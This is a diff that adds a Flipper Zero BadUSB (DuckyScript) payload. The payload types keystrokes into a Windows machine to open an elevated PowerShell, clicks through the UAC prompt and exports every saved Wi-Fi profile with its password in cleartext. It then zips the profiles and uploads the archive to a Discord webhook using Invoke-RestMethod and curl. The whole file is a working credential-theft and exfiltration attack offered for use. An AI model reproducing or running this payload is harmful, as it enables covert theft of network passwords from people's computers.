@@ -1,0 +1,20 @@
+REM Author: Hekethys
+REM Description: Extraction of wifi profile by webhook discord
+REM Version: 1.0
+REM OS category: Windows
+REM Feel free to adjust the delays depending on the target machine
+
+DELAY 200
+WINDOWS r
+DELAY 200
+ALTSTRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 2000
+LEFTARROW
+ENTER
+DELAY 800
+ALTSTRING $webhookurl="Discord Webhook URL";$folderDateTime=(Get-Date).ToString('d-M-y HHmmss');$userDir=(Get-ChildItem env:\userprofile).value+'\HEKETHYS '+$folderDateTime;$fileSaveDir=New-Item ($userDir) -ItemType Directory;$date=Get-Date;netsh wlan export profile key=clear folder=$fileSaveDir;Compress-Archive -Path $fileSaveDir -DestinationPath c:\results-zipped-flipper.zip -Force;$resultsMessage="**Results** - User: $($env:username) - Date: $($date.ToString('dd/MM/yyyy HH:mm:ss'))`n`n[More Scripts here](https://github.com/Hekethys/FlipperZero)";$Body = @{'username' = $env:username; 'content' = $resultsMessage};Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookurl -Method Post -Body ($Body | ConvertTo-Json);& curl.exe -F "file1=@c:\results-zipped-flipper.zip" $webhookurl
+ENTER
+DELAY 6000
+ALTSTRING exit
+ENTER
